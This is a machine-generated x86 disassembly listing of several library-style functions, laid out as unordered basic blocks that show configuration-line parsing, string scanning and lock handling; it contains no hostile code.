0xb10b1a0:	push	ebp
0xb10b1a1:	mov	ebp, edx
0xb10b1a3:	push	edi
0xb10b1a4:	mov	edi, eax
0xb10b1a6:	push	esi
0xb10b1a7:	push	ebx
0xb10b1a8:	call	0xb1267db
None
|
|
|
v
0xb10b292:	xor	eax, eax
0xb10b294:	jmp	0xb10b1e8
None
|
|
|
v
0xb10b268:	mov	eax, dword ptr [esp + 0x2c]
0xb10b26c:	mov	dword ptr [esp], 0
0xb10b273:	mov	dword ptr [esp + 8], eax
0xb10b277:	lea	eax, dword ptr [ebx - 0x47d3b]
0xb10b27d:	mov	dword ptr [esp + 4], eax
0xb10b281:	call	0xb062c40
None
|
|
|
v
0xb10b1d8:	mov	eax, dword ptr [ebx - 0xfc]
0xb10b1de:	mov	ecx, dword ptr [esp + 0x54]
0xb10b1e2:	or	dword ptr [eax + 0x2c], ecx
0xb10b1e5:	lea	eax, dword ptr [esi + 2]
0xb10b1e8:	add	esp, 0x3c
0xb10b1eb:	pop	ebx
0xb10b1ec:	pop	esi
0xb10b1ed:	pop	edi
0xb10b1ee:	pop	ebp
0xb10b1ef:	ret	
None
|
|
|
v
0xb10b1f0:	lea	eax, dword ptr [ebx - 0x4886e]
0xb10b1f6:	mov	dword ptr [esp + 8], 3
0xb10b1fe:	mov	dword ptr [esp + 4], eax
0xb10b202:	mov	dword ptr [esp], esi
0xb10b205:	call	0xb017430
None
|
|
|
v
0xb10b248:	mov	dword ptr [esp + 0x10], esi
0xb10b24c:	mov	dword ptr [esp + 0xc], ebp
0xb10b250:	mov	dword ptr [esp + 8], edi
0xb10b254:	mov	dword ptr [esp + 4], eax
0xb10b258:	lea	eax, dword ptr [esp + 0x2c]
0xb10b25c:	mov	dword ptr [esp], eax
0xb10b25f:	call	0xb04d4c0
None
|
|
|
v
0xb10b20e:	mov	eax, dword ptr [ebx - 0xfc]
0xb10b214:	mov	edx, dword ptr [esp + 0x54]
0xb10b218:	not	edx
0xb10b21a:	and	dword ptr [eax + 0x2c], edx
0xb10b21d:	add	esp, 0x3c
0xb10b220:	pop	ebx
0xb10b221:	lea	eax, dword ptr [esi + 3]
0xb10b224:	pop	esi
0xb10b225:	pop	edi
0xb10b226:	pop	ebp
0xb10b227:	ret	
None
|
|
|
v
0xb10b286:	mov	eax, dword ptr [esp + 0x2c]
0xb10b28a:	mov	dword ptr [esp], eax
0xb10b28d:	call	0xb017470
None
|
|
|
v
0xb10b1d4:	test	eax, eax
0xb10b1d6:	jne	0xb10b1f0
None
|
|
|
v
0xb10b1e8:	add	esp, 0x3c
0xb10b1eb:	pop	ebx
0xb10b1ec:	pop	esi
0xb10b1ed:	pop	edi
0xb10b1ee:	pop	ebp
0xb10b1ef:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b10b2a0
TOTAL BLOCKS :70
0xb10b437:	mov	ecx, dword ptr [esp + 0x28]
0xb10b43b:	mov	dword ptr [esp + 0x10], esi
0xb10b43f:	mov	dword ptr [esp + 0xc], ecx
0xb10b443:	mov	ecx, dword ptr [esp + 0x38]
0xb10b447:	mov	dword ptr [esp + 4], eax
0xb10b44b:	lea	eax, dword ptr [esp + 0x4c]
0xb10b44f:	mov	dword ptr [esp], eax
0xb10b452:	mov	dword ptr [esp + 8], ecx
0xb10b456:	call	0xb04d4c0
None
|
|
|
v
0xb10b56d:	cmp	al, 0x23
0xb10b56f:	mov	esi, dword ptr [esp + 0x24]
0xb10b573:	je	0xb10b320
None
|
|
|
v
0xb10b39c:	test	al, al
0xb10b39e:	je	0xb10b320
None
|
|
|
v
0xb10b4b0:	call	0xb10b0e0
None
|
|
|
v
0xb10b5a5:	mov	dword ptr [esp + 0x34], eax
0xb10b5a9:	movzx	eax, byte ptr [ebp + 0xb]
0xb10b5ad:	cmp	al, 1
0xb10b5af:	je	0xb10b643
None
|
|
|
v
0xb10b4de:	lea	esi, dword ptr [ebx - 0x4752f]
0xb10b4e4:	mov	dword ptr [esp], esi
0xb10b4e7:	call	0xb032860
None
|
|
|
v
0xb10b628:	cmp	al, 0x23
0xb10b62a:	je	0xb10b320
None
|
|
|
v
0xb10b2c4:	lea	eax, dword ptr [ebx - 0x47560]
0xb10b2ca:	mov	dword ptr [esp], eax
0xb10b2cd:	call	0xb032860
None
|
|
|
v
0xb10b398:	cmp	al, 0x23
0xb10b39a:	je	0xb10b320
None
|
|
|
v
0xb10b4ac:	test	eax, eax
0xb10b4ae:	je	0xb10b4b5
None
|
|
|
v
0xb10b344:	mov	esi, dword ptr [esp + 0x24]
0xb10b348:	mov	dword ptr [esp + 4], 0xa
0xb10b350:	add	dword ptr [esp + 0x28], 1
0xb10b355:	mov	dword ptr [esp], esi
0xb10b358:	call	0xb07ee30
None
|
|
|
v
0xb10b3a0:	mov	eax, esi
0xb10b3a2:	call	0xb10aec0
None
|
|
|
v
0xb10b2b0:	add	ebx, 0x9fd50
0xb10b2b6:	sub	esp, 0x15c
0xb10b2bc:	mov	edi, dword ptr [ebx - 0xfc]
0xb10b2c2:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0xb10b610:	add	esi, 1
0xb10b613:	movzx	eax, byte ptr [esi]
0xb10b616:	test	al, al
0xb10b618:	je	0xb10b320
None
|
|
|
v
0xb10b40e:	add	ebp, 0x10
0xb10b411:	cmp	ebp, dword ptr [esp + 0x20]
0xb10b415:	jne	0xb10b3c0
None
|
|
|
v
0xb10b65b:	mov	eax, dword ptr [esp + 0x34]
0xb10b65f:	call	0xb10b0e0
None
|
|
|
v
0xb10b61e:	movsx	edx, al
0xb10b621:	test	byte ptr [ecx + edx*2 + 1], 0x20
0xb10b626:	jne	0xb10b610
None
|
|
|
v
0xb10b5a9:	movzx	eax, byte ptr [ebp + 0xb]
0xb10b5ad:	cmp	al, 1
0xb10b5af:	je	0xb10b643
None
|
|
|
v
0xb10b3a7:	lea	ebp, dword ptr [ebx - 0x4c860]
0xb10b3ad:	lea	ecx, dword ptr [ebp + 0x70]
0xb10b3b0:	mov	dword ptr [esp + 0x3c], edi
0xb10b3b4:	mov	dword ptr [esp + 0x20], ecx
0xb10b3b8:	mov	dword ptr [esp + 0x34], eax
0xb10b3bc:	sub	eax, esi
0xb10b3be:	mov	edi, eax
0xb10b3c0:	mov	dword ptr [esp + 8], edi
0xb10b3c4:	mov	dword ptr [esp + 4], ebp
0xb10b3c8:	mov	dword ptr [esp], esi
0xb10b3cb:	call	0xb017430
None
|
|
|
v
0xb10b4b5:	lea	esi, dword ptr [ebx - 0x4753c]
0xb10b4bb:	mov	dword ptr [esp], esi
0xb10b4be:	call	0xb032860
None
|
|
|
v
0xb10b492:	mov	eax, dword ptr [esp + 0x2c]
0xb10b496:	mov	dword ptr [esp], eax
0xb10b499:	call	0xb0634f0
None
|
|
|
v
0xb10b3d4:	mov	edx, ebp
0xb10b3d6:	mov	ecx, dword ptr [edx]
0xb10b3d8:	add	edx, 4
0xb10b3db:	lea	eax, dword ptr [ecx - 0x1010101]
0xb10b3e1:	not	ecx
0xb10b3e3:	and	eax, ecx
0xb10b3e5:	and	eax, 0x80808080
0xb10b3ea:	je	0xb10b3d6
None
|
|
|
v
0xb10b35d:	mov	ecx, dword ptr [ebx - 0x110]
0xb10b363:	mov	byte ptr [eax], 0
0xb10b366:	mov	eax, dword ptr gs:[0]
0xb10b36c:	mov	edi, dword ptr [eax + ecx]
0xb10b36f:	mov	dword ptr [esp + 0x30], eax
0xb10b373:	movzx	eax, byte ptr [esp + 0x50]
0xb10b378:	movsx	edx, al
0xb10b37b:	test	byte ptr [edi + edx*2 + 1], 0x20
0xb10b380:	je	0xb10b56d
None
|
|
|
v
0xb10b3d0:	test	eax, eax
0xb10b3d2:	jne	0xb10b40e
None
|
|
|
v
0xb10b53a:	mov	ecx, dword ptr [ebx - 0xfc]
0xb10b540:	mov	edx, 1
0xb10b545:	mov	dword ptr [ecx + 0x18], 0
0xb10b54c:	mov	dword ptr [esp], eax
0xb10b54f:	mov	eax, esi
0xb10b551:	call	0xb10af10
None
|
|
|
v
0xb10b4f0:	mov	dword ptr [esp], eax
0xb10b4f3:	mov	edx, 1
0xb10b4f8:	mov	eax, esi
0xb10b4fa:	mov	dword ptr [esp + 4], 8
0xb10b502:	call	0xb10b1a0
None
|
|
|
v
0xb10b33c:	test	eax, eax
0xb10b33e:	je	0xb10b492
None
|
|
|
v
0xb10b2a0:	push	ebp
0xb10b2a1:	xor	eax, eax
0xb10b2a3:	push	edi
0xb10b2a4:	mov	ecx, 0xc
0xb10b2a9:	push	esi
0xb10b2aa:	push	ebx
0xb10b2ab:	call	0xb1267db
None
|
|
|
v
0xb10b519:	mov	dword ptr [esp], eax
0xb10b51c:	mov	edx, 1
0xb10b521:	mov	eax, esi
0xb10b523:	call	0xb10af10
None
|
|
|
v
0xb10b45b:	test	eax, eax
0xb10b45d:	js	0xb10b320
None
|
|
|
v
0xb10b388:	add	esi, 1
0xb10b38b:	movzx	eax, byte ptr [esi]
0xb10b38e:	movsx	edx, al
0xb10b391:	test	byte ptr [edi + edx*2 + 1], 0x20
0xb10b396:	jne	0xb10b388
None
|
|
|
v
0xb10b4c3:	test	eax, eax
0xb10b4c5:	je	0xb10b4de
None
|
|
|
v
0xb10b590:	mov	eax, dword ptr [esp + 0x34]
0xb10b594:	lea	esi, dword ptr [esi]
0xb10b598:	add	eax, 1
0xb10b59b:	movsx	edx, byte ptr [eax]
0xb10b59e:	test	byte ptr [edi + edx*2 + 1], 0x20
0xb10b5a3:	jne	0xb10b598
None
|
|
|
v
0xb10b320:	mov	eax, dword ptr [esp + 0x2c]
0xb10b324:	mov	dword ptr [esp + 4], 0x100
0xb10b32c:	mov	dword ptr [esp + 8], eax
0xb10b330:	mov	eax, dword ptr [esp + 0x24]
0xb10b334:	mov	dword ptr [esp], eax
0xb10b337:	call	0xb0697e0
None
|
|
|
v
0xb10b657:	mov	esi, eax
0xb10b659:	jmp	0xb10b5e2
None
|
|
|
v
0xb10b528:	lea	esi, dword ptr [ebx - 0x47508]
0xb10b52e:	mov	dword ptr [esp], esi
0xb10b531:	call	0xb032860
None
|
|
|
v
0xb10b507:	lea	esi, dword ptr [ebx - 0x47520]
0xb10b50d:	mov	dword ptr [esp], esi
0xb10b510:	call	0xb032860
None
|
|
|
v
0xb10b556:	mov	eax, dword ptr [ebx - 0xfc]
0xb10b55c:	mov	dword ptr [eax], 1
0xb10b562:	add	esp, 0x15c
0xb10b568:	pop	ebx
0xb10b569:	pop	esi
0xb10b56a:	pop	edi
0xb10b56b:	pop	ebp
0xb10b56c:	ret	
None
|
|
|
v
0xb10b5bd:	cmp	al, 3
0xb10b5bf:	jne	0xb10b320
None
|
|
|
v
0xb10b49e:	lea	eax, dword ptr [ebx - 0x4754f]
0xb10b4a4:	mov	dword ptr [esp], eax
0xb10b4a7:	call	0xb032860
None
|
|
|
v
0xb10b2d2:	test	eax, eax
0xb10b2d4:	mov	ecx, eax
0xb10b2d6:	lea	eax, dword ptr [ebx - 0x4756f]
0xb10b2dc:	cmovne	eax, ecx
0xb10b2df:	mov	ecx, eax
0xb10b2e1:	mov	dword ptr [esp + 0x38], eax
0xb10b2e5:	lea	eax, dword ptr [ebx - 0x4b01c]
0xb10b2eb:	mov	dword ptr [esp + 4], eax
0xb10b2ef:	mov	dword ptr [esp], ecx
0xb10b2f2:	call	0xb063f60
None
|
|
|
v
0xb10b5c5:	mov	eax, dword ptr [ebp + 0xc]
0xb10b5c8:	mov	edx, dword ptr [esp + 0x28]
0xb10b5cc:	mov	dword ptr [esp + 4], eax
0xb10b5d0:	mov	eax, dword ptr [esp + 0x34]
0xb10b5d4:	mov	dword ptr [esp], eax
0xb10b5d7:	mov	eax, dword ptr [esp + 0x38]
0xb10b5db:	call	0xb10b1a0
None
|
|
|
v
0xb10b425:	mov	dword ptr [esp + 4], eax
0xb10b429:	lea	eax, dword ptr [ebx - 0x4aa58]
0xb10b42f:	mov	dword ptr [esp], eax
0xb10b432:	call	0xb028340
None
|
|
|
v
0xb10b5b5:	cmp	al, 2
0xb10b5b7:	je	0xb10b65b
None
|
|
|
v
0xb10b515:	test	eax, eax
0xb10b517:	je	0xb10b528
None
|
|
|
v
0xb10b4ec:	test	eax, eax
0xb10b4ee:	je	0xb10b507
None
|
|
|
v
0xb10b5e2:	test	esi, esi
0xb10b5e4:	je	0xb10b320
None
|
|
|
v
0xb10b60c:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb10b3ec:	mov	ecx, eax
0xb10b3ee:	shr	ecx, 0x10
0xb10b3f1:	test	eax, 0x8080
0xb10b3f6:	cmove	eax, ecx
0xb10b3f9:	lea	ecx, dword ptr [edx + 2]
0xb10b3fc:	cmove	edx, ecx
0xb10b3ff:	add	al, al
0xb10b401:	sbb	edx, 3
0xb10b404:	sub	edx, ebp
0xb10b406:	cmp	edi, edx
0xb10b408:	je	0xb10b57e
None
|
|
|
v
0xb10b664:	mov	esi, eax
0xb10b666:	jmp	0xb10b5e2
None
|
|
|
v
0xb10b303:	or	dword ptr [eax], 0x8000
0xb10b309:	lea	eax, dword ptr [esp + 0x50]
0xb10b30d:	mov	dword ptr [esp + 0x28], 0
0xb10b315:	mov	dword ptr [esp + 0x24], eax
0xb10b319:	lea	esi, dword ptr [esi]
0xb10b320:	mov	eax, dword ptr [esp + 0x2c]
0xb10b324:	mov	dword ptr [esp + 4], 0x100
0xb10b32c:	mov	dword ptr [esp + 8], eax
0xb10b330:	mov	eax, dword ptr [esp + 0x24]
0xb10b334:	mov	dword ptr [esp], eax
0xb10b337:	call	0xb0697e0
None
|
|
|
v
0xb10b5ea:	movzx	eax, byte ptr [esi]
0xb10b5ed:	test	al, al
0xb10b5ef:	je	0xb10b320
None
|
|
|
v
0xb10b481:	mov	eax, dword ptr [esp + 0x4c]
0xb10b485:	mov	dword ptr [esp], eax
0xb10b488:	call	0xb017470
None
|
|
|
v
0xb10b3c0:	mov	dword ptr [esp + 8], edi
0xb10b3c4:	mov	dword ptr [esp + 4], ebp
0xb10b3c8:	mov	dword ptr [esp], esi
0xb10b3cb:	call	0xb017430
None
|
|
|
v
0xb10b579:	jmp	0xb10b39c
None
|
|
|
v
0xb10b3d6:	mov	ecx, dword ptr [edx]
0xb10b3d8:	add	edx, 4
0xb10b3db:	lea	eax, dword ptr [ecx - 0x1010101]
0xb10b3e1:	not	ecx
0xb10b3e3:	and	eax, ecx
0xb10b3e5:	and	eax, 0x80808080
0xb10b3ea:	je	0xb10b3d6
None
|
|
|
v
0xb10b643:	mov	eax, dword ptr [esp + 0x34]
0xb10b647:	mov	edx, dword ptr [esp + 0x28]
0xb10b64b:	mov	dword ptr [esp], eax
0xb10b64e:	mov	eax, dword ptr [esp + 0x38]
0xb10b652:	call	0xb10af10
None
|
|
|
v
0xb10b48d:	jmp	0xb10b320
None
|
|
|
v
0xb10b598:	add	eax, 1
0xb10b59b:	movsx	edx, byte ptr [eax]
0xb10b59e:	test	byte ptr [edi + edx*2 + 1], 0x20
0xb10b5a3:	jne	0xb10b598
None
|
|
|
v
0xb10b536:	test	eax, eax
0xb10b538:	je	0xb10b556
None
|
|
|
v
0xb10b463:	mov	eax, dword ptr [esp + 0x4c]
0xb10b467:	mov	dword ptr [esp], 0
0xb10b46e:	mov	dword ptr [esp + 8], eax
0xb10b472:	lea	eax, dword ptr [ebx - 0x47d3b]
0xb10b478:	mov	dword ptr [esp + 4], eax
0xb10b47c:	call	0xb062c40
None
|
|
|
v
0xb10b386:	nop	
None
|
|
|
v
0xb10b5e0:	mov	esi, eax
0xb10b5e2:	test	esi, esi
0xb10b5e4:	je	0xb10b320
None
|
|
|
v
0xb10b2c2:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0xb10b2f7:	test	eax, eax
0xb10b2f9:	mov	dword ptr [esp + 0x2c], eax
0xb10b2fd:	je	0xb10b49e
None
|
|
|
v
0xb10b417:	mov	dword ptr [esp + 8], 5
0xb10b41f:	lea	eax, dword ptr [ebx - 0x423a4]
0xb10b425:	mov	dword ptr [esp + 4], eax
0xb10b429:	lea	eax, dword ptr [ebx - 0x4aa58]
0xb10b42f:	mov	dword ptr [esp], eax
0xb10b432:	call	0xb028340
None
|
|
|
v
0xb10b630:	mov	dword ptr [esp + 8], 5
0xb10b638:	lea	eax, dword ptr [ebx - 0x423d4]
0xb10b63e:	jmp	0xb10b425
None
|
|
|
v
0xb10b57e:	mov	eax, dword ptr [esp + 0x34]
0xb10b582:	mov	edi, dword ptr [esp + 0x3c]
0xb10b586:	movsx	eax, byte ptr [eax]
0xb10b589:	test	byte ptr [edi + eax*2 + 1], 0x20
0xb10b58e:	je	0xb10b5a9
None
|
|
|
v
0xb10b4c7:	mov	dword ptr [esp], eax
0xb10b4ca:	mov	edx, 1
0xb10b4cf:	mov	eax, esi
0xb10b4d1:	mov	dword ptr [esp + 4], 0x10
0xb10b4d9:	call	0xb10b1a0
None
|
|
|
v
0xb10b5f5:	mov	ecx, dword ptr [esp + 0x30]
0xb10b5f9:	movsx	edx, al
0xb10b5fc:	mov	edi, dword ptr [ebx - 0x110]
0xb10b602:	mov	ecx, dword ptr [ecx + edi]
0xb10b605:	test	byte ptr [ecx + edx*2 + 1], 0x20
0xb10b60a:	je	0xb10b628
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b10b670
TOTAL BLOCKS :8
0xb10b670:	push	ebx
0xb10b671:	call	0xb1267db
None
|
|
|
v
0xb10b6b0:	lea	edx, dword ptr [ebx - 0x9fd60]
0xb10b6b6:	mov	eax, dword ptr [ebx + 0x389c]
0xb10b6bc:	mov	dword ptr [esp + 4], edx
0xb10b6c0:	lea	edx, dword ptr [ebx + 0x2fa4]
0xb10b6c6:	mov	dword ptr [esp], edx
0xb10b6c9:	ror	eax, 9
0xb10b6cc:	xor	eax, dword ptr gs:[0x18]
0xb10b6d3:	call	eax
None
|
|
|
v
0xb10b698:	call	0xb10b2a0
None
|
|
|
v
0xb10b693:	add	esp, 0x18
0xb10b696:	pop	ebx
0xb10b697:	ret	
None
|
|
|
v
0xb10b676:	add	ebx, 0x9f98a
0xb10b67c:	sub	esp, 0x18
0xb10b67f:	mov	edx, dword ptr [ebx + 0x38d8]
0xb10b685:	test	edx, edx
0xb10b687:	jne	0xb10b6b0
None
|
|
|
v
0xb10b69d:	or	dword ptr [ebx + 0x2fa4], 2
0xb10b6a4:	add	esp, 0x18
0xb10b6a7:	pop	ebx
0xb10b6a8:	ret	
None
|
|
|
v
0xb10b689:	mov	eax, dword ptr [ebx + 0x2fa4]
0xb10b68f:	test	eax, eax
0xb10b691:	je	0xb10b698
None
|
|
|
v
0xb10b6d5:	add	esp, 0x18
0xb10b6d8:	pop	ebx
0xb10b6d9:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b10b6e0
TOTAL BLOCKS :53
0xb10b735:	mov	edx, dword ptr [ebx + 0xf80]
0xb10b73b:	add	eax, 4
0xb10b73e:	mov	dword ptr [esp + 0x14], eax
0xb10b742:	mov	dword ptr [esp + 0x10], ecx
0xb10b746:	mov	dword ptr [esp + 0x1c], edx
0xb10b74a:	test	edi, edi
0xb10b74c:	jle	0xb10b77e
None
|
|
|
v
0xb10b9c5:	xor	ecx, ecx
0xb10b9c7:	jmp	0xb10b968
None
|
|
|
v
0xb10b710:	mov	eax, dword ptr [ebx + 0x21c]
0xb10b716:	test	eax, eax
0xb10b718:	mov	edi, eax
0xb10b71a:	jle	0xb10b7c0
None
|
|
|
v
0xb10b74a:	test	edi, edi
0xb10b74c:	jle	0xb10b77e
None
|
|
|
v
0xb10b6e9:	add	ebx, 0x9f917
0xb10b6ef:	sub	esp, 0x4c
0xb10b6f2:	mov	eax, dword ptr [ebx - 0xfc]
0xb10b6f8:	test	byte ptr [eax + 0x2c], 8
0xb10b6fc:	je	0xb10b708
None
|
|
|
v
0xb10b7c0:	mov	eax, dword ptr gs:[0]
0xb10b7c6:	mov	edi, dword ptr [ebx - 0xdc]
0xb10b7cc:	mov	dword ptr [esp + 0x18], eax
0xb10b7d0:	mov	eax, dword ptr [eax + edi]
0xb10b7d3:	mov	dword ptr [esp + 8], 0
0xb10b7db:	mov	dword ptr [esp + 4], 2
0xb10b7e3:	mov	dword ptr [esp], 2
0xb10b7ea:	mov	dword ptr [esp + 0x14], eax
0xb10b7ee:	call	0xb0ed9f0
None
|
|
|
v
0xb10baff:	jmp	0xb10b81c
None
|
|
|
v
0xb10b9b4:	mov	eax, dword ptr [ebx + 0xf80]
0xb10b9ba:	jmp	0xb10b8b0
None
|
|
|
v
0xb10b77e:	mov	eax, dword ptr [esp + 0x14]
0xb10b782:	add	dword ptr [esp + 0x14], 4
0xb10b787:	mov	dword ptr [esp + 0x18], eax
0xb10b78b:	mov	eax, dword ptr [esp + 0x14]
0xb10b78f:	mov	eax, dword ptr [eax - 4]
0xb10b792:	test	eax, eax
0xb10b794:	mov	dword ptr [esp + 0x10], eax
0xb10b798:	jne	0xb10b74a
None
|
|
|
v
0xb10b97c:	mov	eax, dword ptr [esp + 0x18]
0xb10b980:	mov	edi, dword ptr [ebx - 0xdc]
0xb10b986:	mov	edx, dword ptr [esp + 0x14]
0xb10b98a:	mov	dword ptr [ebx + 0x21c], ecx
0xb10b990:	mov	dword ptr [eax + edi], edx
0xb10b993:	cmp	dword ptr gs:[0xc], 0
0xb10b99b:	je	0xb10b99e
None
|
|
|
v
0xb10b7a0:	mov	eax, dword ptr [esp + 0x18]
0xb10b7a4:	mov	edi, dword ptr [esp + 0x20]
0xb10b7a8:	mov	dword ptr [eax], edi
0xb10b7aa:	mov	eax, dword ptr [esp + 0x60]
0xb10b7ae:	mov	edi, dword ptr [esp + 0x10]
0xb10b7b2:	mov	eax, dword ptr [eax + 0x10]
0xb10b7b5:	mov	dword ptr [eax], edi
0xb10b7b7:	add	esp, 0x4c
0xb10b7ba:	pop	ebx
0xb10b7bb:	pop	esi
0xb10b7bc:	pop	edi
0xb10b7bd:	pop	ebp
0xb10b7be:	ret	
None
|
|
|
v
0xb10b942:	mov	ecx, dword ptr [esp + 0x10]
0xb10b946:	mov	ebp, dword ptr [esp + 0x20]
0xb10b94a:	mov	dword ptr [esp + 4], edx
0xb10b94e:	mov	dword ptr [esp], eax
0xb10b951:	mov	dword ptr [esp + 0x10], ecx
0xb10b955:	call	0xb0173e0
None
|
|
|
v
0xb10b74e:	mov	eax, dword ptr [esp + 0x10]
0xb10b752:	mov	edx, dword ptr [esp + 0x1c]
0xb10b756:	mov	ebp, dword ptr [eax]
0xb10b758:	mov	eax, dword ptr [edx + 4]
0xb10b75b:	xor	eax, ebp
0xb10b75d:	test	dword ptr [edx + 8], eax
0xb10b760:	je	0xb10b7a0
None
|
|
|
v
0xb10b7f3:	test	eax, eax
0xb10b7f5:	mov	ebp, eax
0xb10b7f7:	js	0xb10b708
None
|
|
|
v
0xb10b968:	mov	eax, dword ptr [esp + 0x38]
0xb10b96c:	mov	dword ptr [esp + 0x10], ecx
0xb10b970:	mov	dword ptr [esp], eax
0xb10b973:	call	0xb017470
None
|
|
|
v
0xb10b911:	mov	ecx, dword ptr [esp + 0x24]
0xb10b915:	mov	edx, dword ptr [esp + 0x28]
0xb10b919:	test	eax, eax
0xb10b91b:	js	0xb10b9b4
None
|
|
|
v
0xb10b768:	mov	ecx, edx
0xb10b76a:	add	edx, 0xc
0xb10b76d:	mov	esi, dword ptr [ecx + 0x10]
0xb10b770:	xor	esi, ebp
0xb10b772:	test	dword ptr [ecx + 0x14], esi
0xb10b775:	je	0xb10b7a0
None
|
|
|
v
0xb10b826:	mov	dword ptr [esp], ebp
0xb10b829:	call	0xb0db860
None
|
|
|
v
0xb10b7fd:	xor	eax, eax
0xb10b7ff:	mov	ecx, 1
0xb10b804:	cmp	dword ptr gs:[0xc], 0
0xb10b80c:	je	0xb10b80f
None
|
|
|
v
0xb10b9bf:	xor	edx, edx
0xb10b9c1:	xor	ecx, ecx
0xb10b9c3:	jmp	0xb10b94a
None
|
|
|
v
0xb10bb0f:	jmp	0xb10b9ab
None
|
|
|
v
0xb10b892:	mov	edx, dword ptr [esp + 0x3c]
0xb10b896:	test	edx, edx
0xb10b898:	jle	0xb10b9bf
None
|
|
|
v
0xb10b99d:	lock sub	dword ptr [ebx + 0x2fa0], 1
None
|
|
|
v
0xb10b9a5:	jne	0xb10bb04
None
|
|
|
v
0xb10b94a:	mov	dword ptr [esp + 4], edx
0xb10b94e:	mov	dword ptr [esp], eax
0xb10b951:	mov	dword ptr [esp + 0x10], ecx
0xb10b955:	call	0xb0173e0
None
|
|
|
v
0xb10b9ab:	jmp	0xb10b826
None
|
|
|
v
0xb10b978:	mov	ecx, dword ptr [esp + 0x10]
0xb10b97c:	mov	eax, dword ptr [esp + 0x18]
0xb10b980:	mov	edi, dword ptr [ebx - 0xdc]
0xb10b986:	mov	edx, dword ptr [esp + 0x14]
0xb10b98a:	mov	dword ptr [ebx + 0x21c], ecx
0xb10b990:	mov	dword ptr [eax + edi], edx
0xb10b993:	cmp	dword ptr gs:[0xc], 0
0xb10b99b:	je	0xb10b99e
None
|
|
|
v
0xb10b860:	mov	eax, dword ptr [esp + 0x38]
0xb10b864:	test	eax, eax
0xb10b866:	mov	esi, eax
0xb10b868:	mov	dword ptr [esp + 0x1c], eax
0xb10b86c:	je	0xb10b9b0
None
|
|
|
v
0xb10b9c9:	lea	eax, dword ptr [ebx - 0x474c8]
0xb10b9cf:	mov	dword ptr [esp + 0xc], eax
0xb10b9d3:	lea	eax, dword ptr [ebx - 0x474eb]
0xb10b9d9:	mov	dword ptr [esp + 4], eax
0xb10b9dd:	lea	eax, dword ptr [ebx - 0x474df]
0xb10b9e3:	mov	dword ptr [esp + 8], 0x1c8
0xb10b9eb:	mov	dword ptr [esp], eax
0xb10b9ee:	call	0xb027820
None
|
|
|
v
0xb10b6fe:	mov	eax, dword ptr [esp + 0x60]
0xb10b702:	cmp	dword ptr [eax + 8], 2
0xb10b706:	je	0xb10b710
None
|
|
|
v
0xb10b80e:	lock cmpxchg	dword ptr [ebx + 0x2fa0], ecx
0xb10b816:	jne	0xb10baf4
None
|
|
|
v
0xb10b83c:	jmp	0xb10b720
None
|
|
|
v
0xb10b95a:	mov	ecx, dword ptr [esp + 0x10]
0xb10b95e:	test	eax, eax
0xb10b960:	mov	dword ptr [ebx + 0xf80], eax
0xb10b966:	je	0xb10b9c9
None
|
|
|
v
0xb10b720:	mov	eax, dword ptr [esp + 0x60]
0xb10b724:	mov	eax, dword ptr [eax + 0x10]
0xb10b727:	mov	ecx, dword ptr [eax]
0xb10b729:	mov	dword ptr [esp + 0x18], eax
0xb10b72d:	test	ecx, ecx
0xb10b72f:	mov	dword ptr [esp + 0x20], ecx
0xb10b733:	je	0xb10b708
None
|
|
|
v
0xb10b89e:	xor	ecx, ecx
0xb10b8a0:	xor	edi, edi
0xb10b8a2:	mov	dword ptr [esp + 0x20], ebp
0xb10b8a6:	mov	dword ptr [esp + 0x10], ecx
0xb10b8aa:	jmp	0xb10b8c0
None
|
|
|
v
0xb10b81c:	mov	ecx, dword ptr [ebx + 0x21c]
0xb10b822:	test	ecx, ecx
0xb10b824:	jle	0xb10b848
None
|
|
|
v
0xb10b9f3:	lea	esi, dword ptr [esi]
0xb10b9f9:	lea	edi, dword ptr [edi]
None
|
|
|
v
0xb10b884:	test	eax, eax
0xb10b886:	mov	dword ptr [ebx + 0xf80], eax
0xb10b88c:	je	0xb10b9c5
None
|
|
|
v
0xb10baf4:	lea	ecx, dword ptr [ebx + 0x2fa0]
0xb10bafa:	call	0xb0f9430
None
|
|
|
v
0xb10b8b0:	add	esi, 0x20
0xb10b8b3:	add	edi, 1
0xb10b8b6:	cmp	dword ptr [esp + 0x3c], edi
0xb10b8ba:	jle	0xb10b942
None
|
|
|
v
0xb10b82e:	mov	edi, dword ptr [ebx + 0x21c]
0xb10b834:	test	edi, edi
0xb10b836:	je	0xb10b708
None
|
|
|
v
0xb10b6e0:	push	ebp
0xb10b6e1:	push	edi
0xb10b6e2:	push	esi
0xb10b6e3:	push	ebx
0xb10b6e4:	call	0xb1267db
None
|
|
|
v
0xb10b762:	xor	eax, eax
0xb10b764:	jmp	0xb10b777
None
|
|
|
v
0xb10bb04:	lea	eax, dword ptr [ebx + 0x2fa0]
0xb10bb0a:	call	0xb0f9460
None
|
|
|
v
0xb10b872:	mov	eax, dword ptr [esp + 0x3c]
0xb10b876:	lea	eax, dword ptr [eax + eax*2]
0xb10b879:	shl	eax, 2
0xb10b87c:	mov	dword ptr [esp], eax
0xb10b87f:	call	0xb0173f0
None
|
|
|
v
0xb10b848:	lea	eax, dword ptr [esp + 0x3c]
0xb10b84c:	mov	dword ptr [esp + 4], eax
0xb10b850:	lea	eax, dword ptr [esp + 0x38]
0xb10b854:	mov	dword ptr [esp], eax
0xb10b857:	mov	dword ptr [esp + 8], ebp
0xb10b85b:	call	0xb109390
None
|
|
|
v
0xb10b9b0:	xor	ecx, ecx
0xb10b9b2:	jmp	0xb10b97c
None
|
|
|
v
0xb10b8d1:	mov	ecx, dword ptr [esp + 0x1c]
0xb10b8d5:	add	eax, edx
0xb10b8d7:	mov	dword ptr [esp + 0x2c], edx
0xb10b8db:	mov	dword ptr [esp + 0x28], edx
0xb10b8df:	mov	edx, esi
0xb10b8e1:	mov	dword ptr [eax], 2
0xb10b8e7:	sub	edx, ecx
0xb10b8e9:	mov	ebp, edx
0xb10b8eb:	mov	edx, dword ptr [edx + ecx + 0x14]
0xb10b8ef:	add	ecx, 0x10
0xb10b8f2:	mov	dword ptr [esp + 0x24], ecx
0xb10b8f6:	mov	dword ptr [eax + 4], edx
